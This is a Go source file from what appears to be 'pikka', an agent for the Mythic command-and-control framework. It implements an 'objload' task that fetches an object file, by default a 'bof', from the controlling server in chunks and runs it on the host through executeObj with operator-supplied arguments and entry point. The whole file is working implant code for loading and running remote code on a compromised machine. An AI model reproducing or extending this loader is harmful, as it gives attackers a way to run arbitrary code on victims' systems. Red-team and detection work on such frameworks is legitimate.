package objload

import (
	"encoding/json"
	"fmt"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
)

type Arguments struct {
	FileID     string
	Mode       string
	Args       []string
	EntryPoint string
}

func (a *Arguments) parseStringArray(arr []interface{}) []string {
	result := make([]string, len(arr))
	for i, v := range arr {
		result[i] = v.(string)
	}
	return result
}

func (a *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["file_name"]; ok && v != nil {
		if s, ok := v.(string); ok {
			a.FileID = s
		}
	}
	if v, ok := alias["mode"]; ok && v != nil {
		if s, ok := v.(string); ok {
			a.Mode = s
		}
	}
	if v, ok := alias["args"]; ok && v != nil {
		if arr, ok := v.([]interface{}); ok {
			a.Args = a.parseStringArray(arr)
		}
	}
	if v, ok := alias["entry_point"]; ok && v != nil {
		if s, ok := v.(string); ok {
			a.EntryPoint = s
		}
	}
	return nil
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	var args Arguments
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	if args.FileID == "" {
		msg.SetError("Missing file_id parameter")
		task.Job.SendResponses <- msg
		return
	}

	if args.Mode == "" {
		args.Mode = "bof"
	}

	if args.EntryPoint == "" {
		args.EntryPoint = "go"
	}

	var fileBytes []byte

	r := structs.GetFileFromMythicStruct{
		FileID:               args.FileID,
		FullPath:             "",
		Task:                 &task,
		ReceivedChunkChannel: make(chan []byte),
	}

	task.Job.GetFileFromMythic <- r

	for {
		chunk := <-r.ReceivedChunkChannel
		if len(chunk) == 0 {
			break
		}
		fileBytes = append(fileBytes, chunk...)
	}

	if len(fileBytes) == 0 {
		msg.SetError("Retrieved file is empty")
		task.Job.SendResponses <- msg
		return
	}

	output, err := executeObj(fileBytes, args.Mode, args.Args, args.EntryPoint)
	if err != nil {
		msg.SetError(fmt.Sprintf("Execution failed: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	msg.UserOutput = output
	msg.Completed = true
	task.Job.SendResponses <- msg
}
